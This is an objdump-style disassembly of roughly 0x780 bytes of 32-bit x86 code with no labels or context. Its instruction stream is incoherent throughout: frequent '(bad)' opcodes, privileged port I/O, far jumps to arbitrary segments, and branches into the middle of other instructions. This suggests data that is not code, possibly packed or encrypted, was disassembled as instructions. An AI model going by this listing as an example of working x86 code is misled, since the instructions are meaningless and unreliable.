  421b4e:	imul   edi,DWORD PTR [ebp+0xfd33086],0x47
  421b55:	jl     0x421b60
  421b57:	or     DWORD PTR [edi-0x1b],edx
  421b5a:	cdq    
  421b5b:	(bad)  
  421b5c:	mov    edi,0xf0ae73be
  421b61:	fs adc ebx,eax
  421b64:	jl     0x421b57
  421b66:	or     DWORD PTR [ebp-0x2595c57d],edx
  421b6c:	out    dx,eax
  421b6d:	mov    cl,0xe2
  421b6f:	add    DWORD PTR [eax],eax
  421b71:	and    BYTE PTR [bp+di],bl
  421b74:	push   edi
  421b75:	sub    ecx,DWORD PTR [eax+0x19542f21]
  421b7b:	stc    
  421b7c:	lahf   
  421b7d:	mov    edx,0xc6df588b
  421b82:	pop    edi
  421b83:	pop    edi
  421b84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421b85:	fisub  WORD PTR [ebx-0x16]
  421b88:	add    al,0xcb
  421b8a:	inc    edi
  421b8b:	and    ah,BYTE PTR [ecx-0x1fdff577]
  421b91:	xchg   esp,eax
  421b92:	jle    0x421b44
  421b94:	inc    ebp
  421b95:	adc    esi,DWORD PTR [ebx+ebp*4+0x744675ea]
  421b9c:	bound  ebp,QWORD PTR [esi]
  421b9e:	push   edi
  421b9f:	xchg   ebp,eax
  421ba0:	mov    dh,0x96
  421ba2:	cmp    DWORD PTR [ebp+ebp*4-0x5d],0xffffffd9
  421ba7:	xchg   DWORD PTR [esi+0x21cacd97],edi
  421bad:	cdq    
  421bae:	pop    ss
  421baf:	stos   DWORD PTR es:[edi],eax
  421bb0:	mov    ds:0x18ca1501,al
  421bb5:	bound  ebx,QWORD PTR [edx]
  421bb7:	push   edx
  421bb8:	dec    edi
  421bb9:	push   es
  421bba:	stc    
  421bbb:	dec    edi
  421bbc:	ret    
  421bbd:	dec    edx
  421bbe:	popa   
  421bbf:	lahf   
  421bc0:	adc    edi,DWORD PTR [eax+eax*8]
  421bc3:	mov    edx,0x5a8f752f
  421bc8:	mov    ah,0x20
  421bca:	jle    0x421bb1
  421bcc:	mov    al,0xba
  421bce:	adc    ah,BYTE PTR [esi+0x31]
  421bd1:	dec    edi
  421bd2:	data16 ja 0x421bbd
  421bd5:	inc    esp
  421bd6:	ins    DWORD PTR es:[edi],dx
  421bd7:	and    cl,0x7f
  421bda:	repnz test BYTE PTR [edx-0x70],bh
  421bde:	ins    DWORD PTR es:[edi],dx
  421bdf:	stc    
  421be0:	mov    cl,0xc
  421be2:	and    DWORD PTR [esp+edi*2+0x276994b7],0x3904bf39
  421bed:	push   esp
  421bee:	pusha  
  421bef:	dec    ecx
  421bf0:	sti    
  421bf1:	dec    esi
  421bf2:	loope  0x421b7d
  421bf4:	hlt    
  421bf5:	mov    cl,0xda
  421bf7:	fistp  DWORD PTR [esi-0x1c]
  421bfa:	sub    cl,BYTE PTR [edx-0x7e]
  421bfd:	outs   dx,BYTE PTR ds:[esi]
  421bfe:	stos   DWORD PTR es:[edi],eax
  421bff:	rol    DWORD PTR [edx+ebx*8-0x2c],cl
  421c03:	and    DWORD PTR [ecx],esi
  421c05:	push   cs
  421c06:	push   eax
  421c07:	sbb    eax,0xa50963fb
  421c0c:	cli    
  421c0d:	mov    ebp,0xb8e0ede2
  421c12:	std    
  421c13:	mov    eax,0xefd06edf
  421c18:	inc    edx
  421c19:	mov    WORD PTR [ebx-0x79],ss
  421c1c:	or     eax,0xdc2b1422
  421c21:	lods   al,BYTE PTR ds:[esi]
  421c22:	rol    al,cl
  421c24:	fisttp DWORD PTR [edi+0x18806343]
  421c2a:	leave  
  421c2b:	pop    edx
  421c2c:	fs lock into 
  421c2f:	cld    
  421c30:	rcr    esi,1
  421c32:	cmp    ebx,DWORD PTR [ebx+0x3f83ed19]
  421c38:	cli    
  421c39:	cmp    al,0x3b
  421c3b:	aaa    
  421c3c:	push   0x42
  421c3e:	out    dx,eax
  421c3f:	iret   
  421c40:	dec    eax
  421c41:	leave  
  421c42:	adc    BYTE PTR [eax+0x7c],ch
  421c45:	and    eax,0x518fdce
  421c4a:	in     eax,0x13
  421c4c:	es mov bl,0xec
  421c4f:	aaa    
  421c50:	mov    DWORD PTR [ebx],eax
  421c52:	dec    ecx
  421c53:	out    dx,al
  421c54:	and    eax,0xd2757d83
  421c59:	sub    al,0xab
  421c5b:	xlat   BYTE PTR ds:[ebx]
  421c5c:	push   ebx
  421c5d:	and    eax,0x7243a1f9
  421c62:	test   al,0x95
  421c64:	xchg   esi,eax
  421c65:	shl    DWORD PTR [esi],1
  421c67:	loopne 0x421c36
  421c69:	and    eax,0xa729ed90
  421c6e:	loope  0x421c0d
  421c70:	xor    DWORD PTR [ebx-0x51],ecx
  421c73:	sbb    DWORD PTR [ebx+0x1f],esp
  421c76:	push   ss
  421c77:	data16 je 0x421c86
  421c7a:	ja     0x421cab
  421c7c:	ds daa 
  421c7e:	out    dx,al
  421c7f:	xor    BYTE PTR [ebp+0x41],0x9e
  421c83:	xor    eax,0xbd99d76e
  421c88:	add    DWORD PTR [eax],ebp
  421c8a:	daa    
  421c8b:	pop    edx
  421c8c:	mov    edx,0xf37e9587
  421c91:	popa   
  421c92:	push   edi
  421c93:	mov    ebp,0x6781c4f0
  421c98:	out    dx,eax
  421c99:	int    0xec
  421c9b:	jb     0x421cef
  421c9d:	imul   ebp,DWORD PTR [esi],0xffffffad
  421ca0:	imul   esp,DWORD PTR [eax+0x40],0xcc730d53
  421ca7:	fisubr DWORD PTR [esp+eax*1]
  421caa:	mov    bh,0x6e
  421cac:	dec    esi
  421cad:	xor    eax,0xd0a8609c
  421cb2:	ins    BYTE PTR es:[edi],dx
  421cb3:	or     eax,DWORD PTR [esi-0x48]
  421cb6:	aas    
  421cb7:	push   edx
  421cb8:	outs   dx,BYTE PTR ds:[esi]
  421cb9:	xchg   ebx,eax
  421cba:	imul   ecx,DWORD PTR [eax+0x358576a2],0x1e5adcb8
  421cc4:	add    cl,BYTE PTR [edi]
  421cc6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421cc7:	jle    0x421ca4
  421cc9:	in     eax,0x49
  421ccb:	enter  0xf3d7,0x66
  421ccf:	sbb    dh,BYTE PTR [edx-0x70]
  421cd2:	sub    eax,0x3e078f8b
  421cd7:	mov    ds:0x35bd1f09,eax
  421cdc:	xchg   ecx,eax
  421cdd:	inc    BYTE PTR [esi-0x75697c28]
  421ce3:	lods   al,BYTE PTR ds:[esi]
  421ce4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421ce5:	and    dl,BYTE PTR [esi+0x3e]
  421ce8:	xlat   BYTE PTR ds:[ebx]
  421ce9:	jp     0x421ccb
  421ceb:	mov    bh,0x6f
  421ced:	dec    ebx
  421cee:	ficomp DWORD PTR [ebp-0x58de6e0e]
  421cf4:	loopne 0x421cf3
  421cf6:	mov    ds:0x42e10387,eax
  421cfb:	sub    esp,edi
  421cfd:	shr    dh,0x75
  421d00:	call   0x912a3e91
  421d05:	bound  edi,QWORD PTR [ecx-0x24d751ee]
  421d0b:	inc    edx
  421d0c:	adc    edx,ebx
  421d0e:	enter  0xa6fc,0xf5
  421d12:	(bad)  
  421d13:	fcomp  QWORD PTR [eax+0x56]
  421d16:	mov    ah,0x75
  421d18:	loope  0x421d66
  421d1a:	add    BYTE PTR [ebp+0x5198f87d],cl
  421d20:	push   esp
  421d21:	sub    DWORD PTR [eax],esi
  421d23:	inc    esi
  421d24:	and    edi,DWORD PTR [eax-0x273c65fb]
  421d2a:	stos   DWORD PTR es:[edi],eax
  421d2b:	push   esp
  421d2c:	add    al,0x75
  421d2e:	mov    edi,0xcea781f8
  421d33:	pop    edx
  421d34:	mov    bh,0xbf
  421d36:	sub    al,0x19
  421d38:	or     ebp,ebp
  421d3a:	jecxz  0x421d8d
  421d3c:	(bad)
  421d3f:	dec    esi
  421d40:	sub    edx,esi
  421d42:	and    ebp,DWORD PTR [esi-0xa]
  421d45:	jge    0x421d7a
  421d47:	adc    al,0xe2
  421d49:	sahf   
  421d4a:	loop   0x421d46
  421d4c:	jne    0x421d50
  421d4e:	fcomp  DWORD PTR [esi+0x4ed3c9ce]
  421d54:	sub    al,0x3
  421d56:	inc    ebp
  421d57:	fwait
  421d58:	sub    ebx,DWORD PTR [ecx+0x1c0e0ed6]
  421d5e:	ficom  DWORD PTR [ebx+0x5535cd3d]
  421d64:	rcl    BYTE PTR [ecx-0x3e],cl
  421d67:	test   DWORD PTR [ebx+0x55582fc8],ecx
  421d6d:	in     eax,0x38
  421d6f:	imul   edi,DWORD PTR [eax+0x2],0x4f
  421d73:	test   al,0xb2
  421d75:	gs std 
  421d77:	je     0x421d55
  421d79:	push   esp
  421d7a:	jo     0x421dae
  421d7c:	jg     0x421d90
  421d7e:	icebp  
  421d7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421d80:	repnz push ecx
  421d82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421d83:	inc    ebp
  421d84:	lea    eax,[eax+0x7cd62435]
  421d8a:	in     al,0x3f
  421d8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421d8d:	cmp    DWORD PTR [edi-0x1f],ebp
  421d90:	jp     0x421d72
  421d92:	adc    dh,dl
  421d94:	(bad)  
  421d95:	dec    esi
  421d96:	in     eax,0xf0
  421d98:	inc    esi
  421d99:	sub    al,0x57
  421d9b:	idiv   DWORD PTR [esp+esi*4]
  421d9e:	lea    edi,[esi+0x37fec734]
  421da4:	mov    bh,0xf8
  421da6:	and    DWORD PTR [ecx-0x311fe09f],ebx
  421dac:	mov    bh,0x59
  421dae:	ins    BYTE PTR es:[edi],dx
  421daf:	nop
  421db0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421db1:	fisttp QWORD PTR [ebp+0xdc1c629]
  421db7:	xor    BYTE PTR [edx+0x1b],ch
  421dba:	or     ah,0x40
  421dbd:	(bad)  
  421dbe:	fstp   QWORD PTR [ebx]
  421dc0:	in     eax,dx
  421dc1:	xor    eax,DWORD PTR [eax+0x492c1173]
  421dc7:	push   ebx
  421dc8:	inc    edx
  421dc9:	mov    ah,0x6a
  421dcb:	push   edi
  421dcc:	loope  0x421d69
  421dce:	xchg   ebx,eax
  421dcf:	leave  
  421dd0:	mov    es,WORD PTR [eax-0x58]
  421dd3:	inc    esp
  421dd4:	dec    esi
  421dd5:	fiadd  DWORD PTR [ecx-0x3da8d0af]
  421ddb:	push   ebp
  421ddc:	xchg   ecx,eax
  421ddd:	mov    eax,0xb08acf6a
  421de2:	mov    ah,0x4a
  421de4:	jne    0x421d75
  421de6:	aas    
  421de7:	xchg   ebx,eax
  421de8:	push   edi
  421de9:	sbb    bl,BYTE PTR [ebp-0x48]
  421dec:	and    BYTE PTR [ebx+esi*4],0x77
  421df0:	lea    edx,[edx-0x28fd6792]
  421df6:	mov    eax,ds:0xa848372a
  421dfb:	add    DWORD PTR [ebp+0x42a299ca],esi
  421e01:	mov    edx,0x1af0d65e
  421e06:	nop
  421e07:	inc    ebp
  421e08:	mov    eax,ds:0xc8b18d94
  421e0d:	mov    ecx,0x1976f312
  421e12:	inc    esp
  421e13:	pop    ebp
  421e14:	retf   0x1739
  421e17:	and    ebx,DWORD PTR [eax-0x4cf26bac]
  421e1d:	push   ebp
  421e1e:	mov    dl,0xb7
  421e20:	sbb    al,0xb2
  421e22:	js     0x421dce
  421e24:	push   esp
  421e25:	mov    esi,0xfd3a2448
  421e2a:	pushf  
  421e2b:	fadd   QWORD PTR [ecx]
  421e2d:	ret    0xca4b
  421e30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421e31:	je     0x421e14
  421e33:	mov    ch,0x77
  421e35:	jl     0x421ea1
  421e37:	sbb    esi,DWORD PTR [eax+0x15]
  421e3a:	fmulp  st(5),st
  421e3c:	(bad)  
  421e3d:	push   ebx
  421e3e:	mov    bh,0x80
  421e40:	rep lods al,BYTE PTR gs:[esi]
  421e43:	adc    BYTE PTR [ebp+0x66a85c11],0x20
  421e4a:	sub    ebp,DWORD PTR [edx+esi*1+0x32]
  421e4e:	or     al,bh
  421e50:	adc    eax,0x7f33486b
  421e55:	jle    0x421ea2
  421e57:	mov    cl,0x2
  421e59:	adc    DWORD PTR [edi],0x53ea501a
  421e5f:	aaa    
  421e60:	mov    esp,0x86a4b740
  421e65:	arpl   WORD PTR [ebx-0x49],bp
  421e68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421e69:	test   al,0xfe
  421e6b:	inc    eax
  421e6c:	lea    edx,fs:[ecx+0x8]
  421e70:	out    0xdb,eax
  421e72:	mov    dh,0x68
  421e74:	mov    edx,0x804e60a8
  421e79:	xchg   ecx,eax
  421e7a:	ret    0x2657
  421e7d:	inc    esi
  421e7e:	cmp    al,0x32
  421e80:	mov    esi,0x939bd815
  421e85:	cli    
  421e86:	inc    esi
  421e87:	or     dh,BYTE PTR ds:0x9a0a3f84
  421e8d:	or     BYTE PTR [esi-0xa],0x9f
  421e91:	sub    DWORD PTR [ebx],0xc97ed1a7
  421e97:	push   ds
  421e98:	(bad)  
  421e99:	xor    DWORD PTR [ebx-0x68],ecx
  421e9c:	int3   
  421e9d:	or     ebp,DWORD PTR ds:0xcade0fb8
  421ea3:	(bad)  ds:0x9f1f3d1e
  421ea9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421eaa:	push   ebx
  421eab:	fistp  WORD PTR [ebp-0x75960f4c]
  421eb1:	dec    edi
  421eb2:	jbe    0x421f0c
  421eb4:	outs   dx,DWORD PTR ds:[esi]
  421eb5:	call   0x406b:0x2a517b28
  421ebc:	xor    DWORD PTR [esi-0x3e],eax
  421ebf:	push   ecx
  421ec0:	mov    bh,0x10
  421ec2:	push   edi
  421ec3:	fs sahf 
  421ec5:	dec    edx
  421ec6:	add    ebp,DWORD PTR [ebx]
  421ec8:	and    eax,0xfa89e0d6
  421ecd:	add    esp,ebp
  421ecf:	loopne 0x421f17
  421ed1:	push   edi
  421ed2:	xor    ebp,DWORD PTR [edi-0x4f7ffb40]
  421ed8:	ret    0xa036
  421edb:	(bad)  
  421edc:	jp     0x421eb8
  421ede:	add    BYTE PTR [esi+0x59a40acb],ah
  421ee4:	mov    bl,0xea
  421ee6:	pusha  
  421ee7:	shl    DWORD PTR [ebp+eax*2+0xb77fb4c],1
  421eee:	or     BYTE PTR [ecx-0x1e],bl
  421ef1:	out    0xba,eax
  421ef3:	jle    0x421eee
  421ef5:	cmp    BYTE PTR [eax-0x7342c216],ch
  421efb:	nop
  421efc:	adc    dl,BYTE PTR [esi]
  421efe:	mov    ds:0x5e8c0f89,eax
  421f03:	arpl   WORD PTR [eax],ax
  421f05:	aam    0x3
  421f07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421f08:	fnstcw WORD PTR [ecx]
  421f0a:	xor    BYTE PTR [ebp-0x16],0xf1
  421f0e:	pop    ebp
  421f0f:	mov    eax,0x62ffbe38
  421f14:	mov    ds:0xe593675e,eax
  421f19:	or     edx,DWORD PTR [edx-0x33]
  421f1c:	add    edx,DWORD PTR [edi]
  421f1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421f1f:	xchg   ecx,eax
  421f20:	int3   
  421f21:	rcl    BYTE PTR [ecx],1
  421f23:	mov    ecx,0x8e9bb451
  421f28:	or     al,0xac
  421f2a:	dec    eax
  421f2b:	xlat   BYTE PTR ds:[ebx]
  421f2c:	lods   al,BYTE PTR ds:[esi]
  421f2d:	jo     0x421ef5
  421f2f:	pop    edi
  421f30:	shr    BYTE PTR ds:0xeec81030,cl
  421f36:	inc    ecx
  421f37:	pop    edi
  421f38:	aaa    
  421f39:	popf   
  421f3a:	(bad)  
  421f3c:	dec    ebp
  421f3d:	xchg   BYTE PTR [ebx],dl
  421f3f:	sub    cl,ah
  421f41:	outs   dx,DWORD PTR ds:[esi]
  421f42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421f43:	jg     0x421f1f
  421f45:	pop    eax
  421f46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421f47:	pop    es
  421f48:	mov    esi,0x3809cb0a
  421f4d:	jnp    0x421f73
  421f4f:	or     edi,DWORD PTR [ecx+0x59]
  421f52:	xlat   BYTE PTR ds:[ebx]
  421f53:	pop    ecx
  421f54:	and    DWORD PTR [ebx],esp
  421f56:	imul   ebp,DWORD PTR [ebx],0x1e5bb3ae
  421f5c:	xor    eax,0x8bab2ae8
  421f61:	ja     0x421fb4
  421f63:	out    0x67,al
  421f65:	mov    ah,0xaf
  421f67:	adc    BYTE PTR [esi-0x5067ffe],bl
  421f6d:	mov    esi,0x1fad577b
  421f72:	(bad)  
  421f73:	jo     0x421f22
  421f75:	loop   0x421f43
  421f77:	mov    cl,0xae
  421f79:	push   ecx
  421f7a:	icebp  
  421f7b:	cmp    WORD PTR [edx],0xffe1
  421f7f:	fwait
  421f80:	imul   ebp,edi,0x2f
  421f83:	outs   dx,BYTE PTR ds:[esi]
  421f84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421f85:	repz jno 0x421fc5
  421f88:	pop    ecx
  421f89:	and    ecx,DWORD PTR [edx-0x4dde84e6]
  421f8f:	fnstenv [esp+esi*1-0x15]
  421f93:	inc    ebx
  421f94:	test   dh,0xbb
  421f97:	sbb    DWORD PTR es:[ebp+0x3a2c2ca1],eax
  421f9e:	mov    gs,WORD PTR [ecx+0x64]
  421fa1:	sbb    eax,edi
  421fa3:	repnz sar ah,1
  421fa6:	sub    ebx,DWORD PTR [ebx]
  421fa8:	adc    DWORD PTR [edi+0x36901bc0],0x866ac5b3
  421fb2:	cli    
  421fb3:	mov    bh,0x55
  421fb5:	push   ebx
  421fb6:	hlt    
  421fb7:	(bad)  
  421fb8:	cmp    esp,DWORD PTR [ebp-0x1a]
  421fbb:	in     eax,dx
  421fbc:	(bad)  
  421fbe:	loopne 0x421f8c
  421fc0:	mov    ah,BYTE PTR [ecx+0x19fb635a]
  421fc6:	outs   dx,BYTE PTR ds:[esi]
  421fc7:	add    cl,BYTE PTR [esi+ecx*8]
  421fca:	pop    edx
  421fcb:	sub    BYTE PTR [edx-0x3d3ddfb8],ah
  421fd1:	fisub  DWORD PTR [eax-0x74a61293]
  421fd7:	cmc    
  421fd8:	jl     0x421f79
  421fda:	cmp    BYTE PTR [edx+esi*8-0x3e],bh
  421fde:	add    al,0xfb
  421fe0:	mov    al,0x4
  421fe2:	cwde   
  421fe3:	adc    al,0xa5
  421fe5:	push   ds
  421fe6:	xchg   edi,eax
  421fe7:	mov    edx,0xf0a5b29d
  421fec:	popf   
  421fed:	aaa    
  421fee:	xor    edx,edx
  421ff0:	sbb    bl,ch
  421ff2:	mov    ebx,0x5cd8ec80
  421ff7:	ins    BYTE PTR es:[edi],dx
  421ff8:	lock inc ebx
  421ffa:	fsubr  DWORD PTR [eax+ebx*1]
  421ffd:	add    al,0xe4
  421fff:	repz push es
  422001:	adc    eax,0xf3082b6c
  422006:	jne    0x421fb4
  422008:	pop    esp
  422009:	js     0x42200f
  42200b:	int3   
  42200c:	dec    ecx
  42200d:	ret    
  42200e:	std    
  42200f:	mov    ebx,0x34559518
  422014:	repnz cmp BYTE PTR [ecx+eax*4+0xb],bl
  422019:	and    DWORD PTR [eax+0x70],esp
  42201c:	cmp    BYTE PTR [esi+0x5011a33d],ch
  422022:	sahf   
  422023:	or     edx,DWORD PTR [edi+0x9]
  422026:	ins    DWORD PTR es:[edi],dx
  422027:	ja     0x422054
  422029:	lds    eax,FWORD PTR [ecx-0x25]
  42202c:	test   eax,0xb80b2c58
  422031:	stos   BYTE PTR es:[edi],al
  422032:	mov    eax,gs:0xd61dbf0f
  422038:	push   es
  422039:	out    0x42,al
  42203b:	pop    esp
  42203c:	sti    
  42203d:	jnp    0x4220a4
  42203f:	pop    ss
  422040:	dec    edi
  422041:	fst    DWORD PTR [edx-0x564de3a3]
  422047:	jno    0x42202e
  422049:	int    0x49
  42204b:	aas    
  42204c:	retf   0x40f7
  42204f:	stos   DWORD PTR es:[edi],eax
  422050:	idiv   BYTE PTR [eax]
  422052:	das    
  422053:	addr16 repnz pop ebp
  422056:	sub    dh,al
  422058:	popf   
  422059:	add    al,0x87
  42205b:	xchg   esi,eax
  42205c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42205d:	loope  0x422056
  42205f:	sbb    edi,edx
  422061:	das    
  422062:	sub    ebx,DWORD PTR [esi-0x1a]
  422065:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422067:	mov    ebx,0xd452dc8e
  42206c:	dec    esp
  42206d:	out    dx,al
  42206e:	xor    eax,0x28ccb77a
  422073:	mov    eax,ds:0x81ed84d1
  422078:	xchg   esp,eax
  422079:	jp     0x4220d1
  42207b:	jl     0x422002
  42207d:	ror    al,cl
  42207f:	sahf   
  422080:	imul   ecx,DWORD PTR [esi-0x3d],0x28347a63
  422087:	outs   dx,BYTE PTR ds:[esi]
  422088:	fcom   QWORD PTR [ebp+0x5fce4534]
  42208e:	bound  eax,QWORD PTR [esi]
  422090:	mov    bl,0x9a
  422092:	sbb    eax,0xdb14c92f
  422097:	push   edi
  422098:	cmp    BYTE PTR [edi-0xf],cl
  42209b:	inc    ebx
  42209c:	xor    DWORD PTR [edx-0x2206c55d],ebp
  4220a2:	mov    ebp,0xe18d4858
  4220a7:	or     DWORD PTR [eax+0xa],edx
  4220aa:	inc    esi
  4220ab:	pop    eax
  4220ac:	mov    ds:0xf96ae768,al
  4220b1:	jbe    0x42212a
  4220b3:	pop    esp
  4220b4:	add    eax,0x54f9b5e4
  4220b9:	or     al,0xcc
  4220bb:	push   edi
  4220bc:	jae    0x422065
  4220be:	arpl   WORD PTR [edi-0x7e],di
  4220c1:	sbb    ecx,ebx
  4220c3:	mov    ebp,0xe1d67501
  4220c8:	bound  eax,QWORD PTR [ecx+0x72dd3687]
  4220ce:	ins    DWORD PTR es:[edi],dx
  4220cf:	sub    eax,0x7ac67cba
  4220d4:	into   
  4220d5:	sbb    esi,DWORD PTR [eax]
  4220d7:	sbb    DWORD PTR [ebx+0x39],edx
  4220da:	scas   al,BYTE PTR es:[edi]
  4220db:	inc    ebx
  4220dc:	mov    al,0x8e
  4220de:	into   
  4220df:	ds mov ebx,0x2598cf1b
  4220e5:	ds popa 
  4220e7:	(bad)  
  4220e8:	dec    ebp
  4220e9:	xchg   DWORD PTR [ebx-0x5b1c5249],ebp
  4220ef:	push   0xf
  4220f1:	test   eax,0xbce9cfed
  4220f6:	rcr    al,cl
  4220f8:	jg     0x4220b3
  4220fa:	and    al,0x91
  4220fc:	lahf   
  4220fd:	jne    0x4220d6
  4220ff:	inc    edx
  422100:	xor    DWORD PTR [ecx+0x1b],0x8954bbfb
  422107:	cmc    
  422108:	retf   0xb6
  42210b:	sar    DWORD PTR [edi],0x68
  42210e:	push   edx
  42210f:	ins    DWORD PTR es:[edi],dx
  422110:	xchg   ebp,eax
  422111:	sbb    eax,0x5a5c67a8
  422116:	daa    
  422117:	test   DWORD PTR [edi],edi
  422119:	add    dl,dh
  42211b:	mov    ?,esp
  42211d:	fwait
  42211e:	pop    eax
  42211f:	adc    BYTE PTR [ebp-0x2bbb3420],0x4c
  422126:	std    
  422127:	cs jmp 0x422179
  42212a:	cmp    DWORD PTR [eax+0x3],eax
  42212d:	js     0x42217f
  42212f:	jns    0x4220e6
  422131:	jecxz  0x4220df
  422133:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422134:	daa    
  422135:	ror    DWORD PTR [edi],cl
  422137:	push   es
  422138:	ret    
  422139:	push   ecx
  42213a:	add    DWORD PTR [edx],0x5a
  42213d:	fistp  QWORD PTR [eax]
  42213f:	jle    0x422100
  422141:	push   eax
  422142:	in     eax,dx
  422143:	sub    al,0xaf
  422145:	sar    BYTE PTR [edi+eiz*4],1
  422148:	dec    edx
  422149:	repnz in al,0x27
  42214c:	jl     0x4221b6
  42214e:	xor    DWORD PTR [eax+0x6d99ed9a],eax
  422154:	js     0x4220e7
  422156:	jmp    0xde47:0x6f6f5551
  42215d:	punpckhdq mm1,mm0
  422160:	not    DWORD PTR [ebp-0x60]
  422163:	inc    esp
  422164:	(bad)  
  422165:	jmp    0x6f16:0x26f9c3fc
  42216c:	out    0x60,al
  42216e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42216f:	ret    
  422170:	lds    ebp,FWORD PTR [eax-0x46]
  422173:	icebp  
  422174:	mov    cl,0xb1
  422176:	fs int3 
  422178:	push   edi
  422179:	std    
  42217a:	mov    al,ds:0xeb515394
  42217f:	sub    al,bh
  422181:	and    DWORD PTR [edx-0x2cec20a3],ebx
  422187:	xlat   BYTE PTR ds:[ebx]
  422188:	call   0x5309:0x776aafea
  42218f:	(bad)  
  422190:	ret    
  422191:	dec    eax
  422192:	dec    eax
  422193:	jb     0x4221b0
  422195:	fwait
  422196:	sub    edi,DWORD PTR [edi+esi*2+0x32]
  42219a:	or     eax,0xa9a270f2
  42219f:	sub    bl,BYTE PTR [edx+0x48]
  4221a2:	mov    ebp,eax
  4221a4:	sbb    BYTE PTR [eax-0x68f41d80],bl
  4221aa:	mov    dl,BYTE PTR [esi+edx*4-0x346bd74c]
  4221b1:	cmp    dl,BYTE PTR [ebx-0x4d]
  4221b4:	xor    eax,0x9196fa95
  4221b9:	enter  0x83f1,0x5f
  4221bd:	dec    ecx
  4221be:	mov    ds:0xbd3e437f,al
  4221c3:	ror    DWORD PTR [ecx+0x3e],0x84
  4221c7:	or     BYTE PTR [ebx+0x6],cl
  4221ca:	mov    dl,0x69
  4221cc:	dec    ebx
  4221cd:	mov    bh,0xbe
  4221cf:	xlat   BYTE PTR ds:[ebx]
  4221d0:	xor    DWORD PTR [esi],esi
  4221d2:	dec    esi
  4221d3:	rcr    DWORD PTR [esi+0x3ce0391a],cl
  4221d9:	jae    0x42225a
  4221db:	jg     0x89789ad5
  4221e1:	cmc    
  4221e2:	ins    BYTE PTR es:[edi],dx
  4221e3:	and    dl,0xf5
  4221e6:	aas    
  4221e7:	leave  
  4221e8:	iret   
  4221e9:	stos   BYTE PTR es:[edi],al
  4221ea:	jbe    0x4221cb
  4221ec:	mov    fs,ecx
  4221ee:	jmp    0x47dd:0xbf238e96
  4221f5:	(bad)  
  4221f6:	cld    
  4221f7:	mov    al,0x12
  4221f9:	jg     0x4221db
  4221fb:	imul   ebx,DWORD PTR [ebx+0x4f],0xffffff8c
  4221ff:	(bad)  
  422200:	push   ebx
  422201:	push   esp
  422202:	adc    eax,ebp
  422204:	push   0xffffffb4
  422206:	xchg   DWORD PTR [edi+edi*8],esp
  422209:	(bad)  
  42220a:	(bad)  
  42220b:	inc    edx
  42220c:	add    BYTE PTR [edx-0x7193fdf1],bl
  422212:	shl    cl,0xc8
  422215:	ja     0x42222a
  422217:	(bad)  
  422218:	cmp    edx,DWORD PTR es:[ecx+0x14]
  42221c:	rol    edi,cl
  42221e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42221f:	mov    ah,0x88
  422221:	fdivr  DWORD PTR [ebp+esi*8-0x497cbd2f]
  422228:	sub    bx,WORD PTR [eax]
  42222b:	pop    edi
  42222d:	out    dx,eax
  42222e:	sar    DWORD PTR [esi+esi*8-0x3b745607],cl
  422235:	int    0x60
  422237:	cmp    BYTE PTR [esi+0x5910a47b],bh
  42223d:	sbb    bh,BYTE PTR [edx+ebp*8]
  422240:	fsub   st(2),st
  422242:	adc    al,0x14
  422244:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422245:	jmp    FWORD PTR [esi]
  422247:	popa   
  422248:	fst    QWORD PTR [ebx+0x725acb56]
  42224e:	dec    ebx
  42224f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422250:	mov    gs,WORD PTR [ebx+0x5a]
  422253:	push   cs
  422254:	sub    DWORD PTR [esi-0x46],ecx
  422257:	sbb    BYTE PTR [esi+edi*2+0x2ed8ab0],dh
  42225e:	out    dx,al
  42225f:	sub    dh,bl
  422261:	int3   
  422262:	sub    cl,BYTE PTR [esi-0x25be763c]
  422268:	popa   
  422269:	pushf  
  42226a:	cld    
  42226b:	push   ebx
  42226c:	push   ecx
  42226d:	add    DWORD PTR [ecx+0x5c],edx
  422270:	test   BYTE PTR [ebp-0x6df2ecea],cl
  422276:	iret   
  422277:	pop    ebp
  422278:	xor    bl,al
  42227a:	lock jmp 0xd0360193
  422280:	pop    edi
  422281:	jecxz  0x4222f6
  422283:	or     BYTE PTR ds:0x4ae5729e,al
  422289:	xor    BYTE PTR [eax],0x3b
  42228c:	adc    BYTE PTR [esi-0xe],al
  42228f:	xchg   edi,eax
  422290:	mov    ecx,0x38aec2b
  422295:	xchg   ebp,eax
  422296:	pop    ebx
  422297:	divps  xmm5,XMMWORD PTR [ecx]
  42229a:	push   0xffffff8b
  42229c:	in     al,0x34
  42229e:	rcl    BYTE PTR [ebx-0x9],0xa2
  4222a2:	add    dl,dh
  4222a4:	pop    es
  4222a5:	xchg   edi,eax
  4222a6:	sub    al,0x84
  4222a8:	cs popa 
  4222aa:	sahf   
  4222ab:	jne    0x42230d
  4222ad:	pop    ebp
  4222ae:	mov    eax,ds:0x73ace4a
  4222b3:	mov    dh,0x1a
  4222b5:	dec    ebp
  4222b6:	cwde   
  4222b7:	jp     0x4222c4
  4222b9:	inc    esi
  4222ba:	ins    DWORD PTR es:[edi],dx
  4222bb:	or     ch,BYTE PTR [ebp-0x50fd4aea]
  4222c1:	bound  ecx,QWORD PTR ds:0xc14e0205
  4222c7:	dec    edx
  4222c8:	les    ebp,FWORD PTR [esi+0x3c6ec5b2]
  4222ce:	stc    
